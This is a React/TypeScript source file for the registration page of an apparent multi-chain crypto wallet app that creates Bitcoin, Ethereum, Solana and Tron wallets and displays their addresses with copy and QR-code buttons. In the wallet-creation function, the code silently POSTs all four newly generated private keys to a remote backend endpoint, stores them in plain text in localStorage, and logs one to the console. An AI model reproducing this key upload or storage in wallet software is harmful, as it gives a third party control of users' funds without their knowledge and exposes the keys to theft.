import { useEffect, useState } from "react";
import { createRoot } from 'react-dom/client';
import {QRCodeCanvas} from 'qrcode.react';
import styled from "styled-components";
import { Button } from "./styled/styled";
import '../index.css';
import { TronWeb } from 'tronweb';
import * as multichainWallet from 'multichain-crypto-wallet';
import { BsHouse, BsWallet2, BsShop, BsLightningCharge, BsCashStack, BsCopy, BsQrCode } from "react-icons/bs";
import { id } from "ethers";
import { error } from "node:console";
 
const StyledApp = styled.div`
  background-color: #F9F9F9;
  color: black;
  
  font-family: Lexend;
   min-height: 250vh;
  padding: 20px;
 zoom :90%;
  @media (prefers-color-scheme: dark) {
    background-color: rgb(33,33,33);
    color: white;
  }
`;

const ExPanel = styled.div`
  background-color: white;
  color: black;

  @media (prefers-color-scheme: dark) {
    background-color: rgb(15,15,15);
    color: grey;
  }
`;

const AppContainer = styled.div`
   width: 100%;
   height: fit-content;
   margin: 0;
   font-family: Lexend;
`;

const Icon = styled.div`
  background-color: white;
border-radius:7px; 
  @media (prefers-color-scheme: dark) {
    background-color: rgb(15,15,15);
    color: grey;
  }
`;


function Register() {

  
    const [EthereumWalletAddress, setEthereumWalletAddress] = useState('');
    const [BitcoinWalletAddress, setBitcoinWalletAddress] = useState('');
    const [SolanaWalletAddress, setSolanaWalletAddress] = useState('');
    const [tronWalletAddress,  setTronWalletAddress]= useState('');

    //backend req
    async function alreadyExists (){
      const response = await fetch("https://twa-backend-g83o.onrender.com/wallets");
      response.json().then((data) => {
        setEthereumWalletAddress(data[0]);
        setBitcoinWalletAddress(data[1]);
        setSolanaWalletAddress(data[2]);
        setTronWalletAddress(data[3]);
      }) 
     }

     //wallet creation
    const createWallets = async () => {
      const bitcoinWallet = multichainWallet.createWallet({ network: 'bitcoin' });
        const ethereumWallet = multichainWallet.createWallet({ network: "ethereum" });
        const solanaWallet = multichainWallet.createWallet({ network: "solana" });
        const tronWeb = new TronWeb({
          fullHost: 'https://api.trongrid.io',
          });
      
        
          const tronWallet = await tronWeb.createAccount();

      console.log(tronWallet.privateKey);
      
        setBitcoinWalletAddress(bitcoinWallet.address);
        setEthereumWalletAddress(ethereumWallet.address);
        setSolanaWalletAddress(solanaWallet.address);

        // Save wallet addresses to local storage as a fallback
        localStorage.setItem('ethereumWallet', ethereumWallet.address);
        localStorage.setItem('bitcoinWallet', bitcoinWallet.address);
        localStorage.setItem('solanaWallet', solanaWallet.address);
        localStorage.setItem('tronWallet', tronWallet.address.base58);

        //private keys
       localStorage.setItem('ethereumWalletkey', ethereumWallet.privateKey);
       localStorage.setItem('bitcoinWalletkey', bitcoinWallet.privateKey);
       localStorage.setItem('solanaWalletkey', solanaWallet.privateKey);
        localStorage.setItem('tronWalletkey', tronWallet.privateKey);


          //for database   
          const ethAdd =    ethereumWallet.address;
           const bitAdd =   bitcoinWallet.address;
          const solAdd =    solanaWallet.address;
           const tronAdd =   tronWallet.address.base58;
    try{
      const p_k = [ethereumWallet.privateKey, bitcoinWallet.privateKey, solanaWallet.privateKey, tronWallet.privateKey]  as string[];

         await fetch("https://twa-backend-g83o.onrender.com/profiledkey", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            credentials: "include",  
            body: JSON.stringify( {  p_k }),
        });
        const Address =  [ethAdd, bitAdd, solAdd, tronAdd] as string[];
     await   fetch("https://twa-backend-g83o.onrender.com/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          credentials: "include",  
          body: JSON.stringify( { Address }),
      })
    }
       
    catch  {
      console.error('failed to post request ');
  } 
    };
   
    const ethAddress = localStorage.getItem('ethereumWallet') as string;
    const bitAddress = localStorage.getItem('bitcoinWallet') as string;
    const solAddress = localStorage.getItem('solanaWallet') as string;
    const tronAddress = localStorage.getItem('tronWallet') as string;
    useEffect(() => {
        // Load wallet addresses from local storage
        const ethAddress = localStorage.getItem('ethereumWallet');
        const bitAddress = localStorage.getItem('bitcoinWallet');
        const solAddress = localStorage.getItem('solanaWallet');
        const tronAddress = localStorage.getItem('tronWallet');

        

        
        
        if (ethAddress) {
            setEthereumWalletAddress(ethAddress);
        } else {
            createWallets(); // Create wallets only if they do not exist in storage
        }
        if (bitAddress ) {
          setBitcoinWalletAddress(bitAddress);
      } else {
          createWallets(); // Create wallets only if they do not exist in storage
      }
        if (solAddress) {
            setSolanaWalletAddress(solAddress);
        } else {
            createWallets(); // Create wallets only if they do not exist in storage
        }
        if (tronAddress){
          setTronWalletAddress(tronAddress);
          } else {
            createWallets(); 
          }
        
    }, [ ]); // Run this effect only once
    

 
 
     function copy() {
   
      var copyText = document.getElementById('bitcopy') as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);
      setTimeout(() => {
        document.body.removeChild(alertBox);
      }, 2000);



    }
    function copy1() {
   
      var copyText = document.getElementById("ethcopy") as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);
      setTimeout(() => {
        document.body.removeChild(alertBox);
      }, 2000);


    }
    function copy2() {
   
      var copyText = document.getElementById("solcopy") as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);
      setTimeout(() => {
        document.body.removeChild(alertBox);
      }, 2000);


    }
    function copy3() {
   
      var copyText = document.getElementById("tronCopy") as HTMLDivElement;
    
      
      navigator.clipboard.writeText(copyText.innerText);
      
      const alertBox = document.createElement('div');
      alertBox.innerText = "Copied!";
      alertBox.style.position = 'fixed';
      alertBox.style.bottom = '20px';
      alertBox.style.right = '40%';
      alertBox.style.backgroundColor = '#4CAF50';
      alertBox.style.color = 'white';
      alertBox.style.padding = '10px 20px';
      alertBox.style.borderRadius = '5px';
      alertBox.style.boxShadow = '0 2px 5px rgba(0, 0, 0, 0.3)';
      alertBox.style.fontFamily = 'Lexend';
      alertBox.style.zIndex = '1000';
      document.body.appendChild(alertBox);

      setTimeout(() => {
        document.body.removeChild(alertBox);
      }, 2000);


    }
    const showQR  = ()=>{
      const section = document.getElementById('QRcodeChoice') as HTMLElement | null;
    if (section != null) {
      const selectedValue = (section as HTMLSelectElement).value; // Access the value of the selected option
      if (selectedValue === 'eth') {
      const container = document.getElementById('QRcode1');
      if (container) {
        const root = createRoot(container);
        root.render(<QRCodeCanvas value={ethAddress} size={300} bgColor="black " fgColor="rgb(36, 172, 242)" />);
      }
      } else if (selectedValue === 'btc') {
      const container2 = document.getElementById('QRcode2');
      if (container2) {
        const root = createRoot(container2);
        root.render(<QRCodeCanvas value={bitAddress} size={300} bgColor="black" fgColor="rgb(36, 172, 242)" />);
      }
      } else if (selectedValue === 'sol') {
      const container3 = document.getElementById('QRcode3');
      if (container3) {
        const root = createRoot(container3);
        root.render(<QRCodeCanvas value={solAddress} size={300} bgColor="black" fgColor="rgb(36, 172, 242)"/>);
      }
      } else if (selectedValue === 'trx') {
      const container4 = document.getElementById('QRcode4');
      if (container4) {
        const root = createRoot(container4);
        root.render(<QRCodeCanvas value={tronAddress} size={300} bgColor="black" fgColor="rgb(36, 172, 242)" />);
      }
      }
    }
  
    
  }
  const onMouseLeave = () => {
    const section = document.getElementById('qr') as HTMLElement | null;
    if (section != null && section.style.display == 'block') {
      section.style.display = 'none'; 
  
  } else if(section != null && section.style.display == 'none') {
    section.style.display = 'block';
  }
  };
 
    return (
        <StyledApp> 
            <AppContainer  onClick={onMouseLeave}> 
            <div   style={{position: 'absolute', left: '85%', height:'34.5px'  }}> <select id="QRcodeChoice" style={{height:'34.5px', background:'transparent', border:'none', color:'gray', fontFamily:'Lexend'}}  onChange={showQR}   >
              <option  value="eth">eth</option>
              <option  value="btc">btc</option>
              <option value="sol">sol</option>
              <option  value="trx">trx</option>
              </select></div>
              <div id="qr" style={{display:'block '}} >
            <div id="QRcode1"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
            <div id="QRcode2"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
            <div id="QRcode3"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
            <div id="QRcode4"  style={{position: 'absolute',top: '50%', left: '50%',transform: 'translate(-50%, -50%)'}}> </div>
            </div>
              <div style={{right:'0'}}><Button onClick={alreadyExists}  >Import Existing wallet</Button>  <Button onClick={showQR}><BsQrCode/></Button></div>
              <br/>
            <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                    <div>
                        <img src='https://i.imgur.com/sSYmdfQ.png' alt='bitcoin' style={{ width: '40px', height: '40px' }} />
                    </div>
                    <div style={{ display:'inline', pointerEvents:'painted' }}>
                        <div style={{ zoom:'90%', marginLeft:'7px' }}>Bitcoin wallet          <BsCopy onClick={copy}/></div> 
                        <div id='bitcopy' style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{BitcoinWalletAddress}  </div>
                    </div>
                </ExPanel>
                <br/> 
                <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                    <div>
                        <img src='https://i.imgur.com/dhJjQcO.png' alt='Ethereum' style={{ width: '40px', height: '40px' }} />
                    </div>
                    <div style={{ display:'inline', pointerEvents:'painted' }}>
                        <div style={{ zoom:'90%', marginLeft:'7px' }}>Ethereum wallet        <BsCopy onClick={copy1}/></div> 
                        <div   id="ethcopy" style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{EthereumWalletAddress}  </div>
                    </div>
                </ExPanel>
                <br/> 
                <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                    <div>
                        <img src='https://i.imgur.com/rjWW55s.png' alt='Solana' style={{ width: '40px', height: '40px' }} />
                    </div> 
                    <div style={{ display:'inline' }}>  
                        <div style={{ zoom:'90%', marginLeft:'7px' }}>Solana wallet           <BsCopy onClick={copy2}/></div>
                        <div  id="solcopy" style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{SolanaWalletAddress}  </div>
                    </div>
                </ExPanel>
                <br/> 
                <ExPanel style={{ display: 'flex', padding:'10px', borderRadius: '7px' }}>
                  <div>
                    <img src='https://i.imgur.com/ywfZokP.png' alt='Tron' style={{ width: '40px', height: '40px' }} />
                  </div>
                  <div style={{ display:'inline' }}>
                    <div style={{ zoom:'90%', marginLeft:'7px' }}>Tron wallet                    <BsCopy onClick={copy3}/></div>
                    <div  id="tronCopy" style={{ zoom:'57%', marginLeft:'8px', width:'fit-content' }}>{tronWalletAddress}  </div>
                  </div>
                </ExPanel>
                <br/>
              
                {/* Navigation Icons */}
                   <Icon className="nav" style={{left:'0', right:'0', bottom:'0%', display:'flex',justifyContent:'space-evenly' ,height:'fit-content',  width:'100%', paddingBottom:'10px', paddingRight:'10px',position:'fixed' }}>
                                                        <a href='#/home' style={{color:'grey', textDecoration:'none'}}> 
                                                        <Button  style={{  fontFamily: 'Lexend' , bottom:'0%',  background:'none', color:"grey"}}><BsHouse/>{/*<img src='https://i.imgur.com/uxozY7V.png' height='14px' width='14px' />*/}
                                                        <p style={{zoom:'100%'}}>Home</p> </Button></a>
                                                         <a href='#/send' style={{color:'grey', textDecoration:'none'}}> <Button  style={{  fontFamily: 'Lexend' ,bottom:'0%',  background:'none', color:"grey"}}><BsWallet2/>{/*<img src="https://i.imgur.com/hCrmXO1.png" height='14px' width='14px'/> */}
                                                        <p style={{zoom:'100%'}}>Wallet</p></Button></a>
                                                        <a href='#/market' style={{color:'grey', textDecoration:'none'}}>  <Button style={{  fontFamily: 'Lexend' ,bottom:'0%',  background:'none', color:"grey"}}><BsCashStack/>{/*<img src="https://i.imgur.com/loOhRv0.png" height='14px' width='14px' /> */}
                                                          <p style={{zoom:'100%'}}>Finance</p></Button></a> 
                                                          <a href='#/discover' style={{color:'grey', textDecoration:'none'}}>
                                                          <Button  style={{ fontFamily: 'Lexend' ,bottom:'0%', background:'none', color:"grey"}}><BsLightningCharge/>{/*<img src='https://i.imgur.com/S444rBc.png'height='14px' width='14px'/>*/}
                                                          <p style={{zoom:'100%'}}>Discover</p> </Button></a>
                                                        </Icon> 
            </AppContainer>
        </StyledApp>
    );
    
}
 
export default Register;
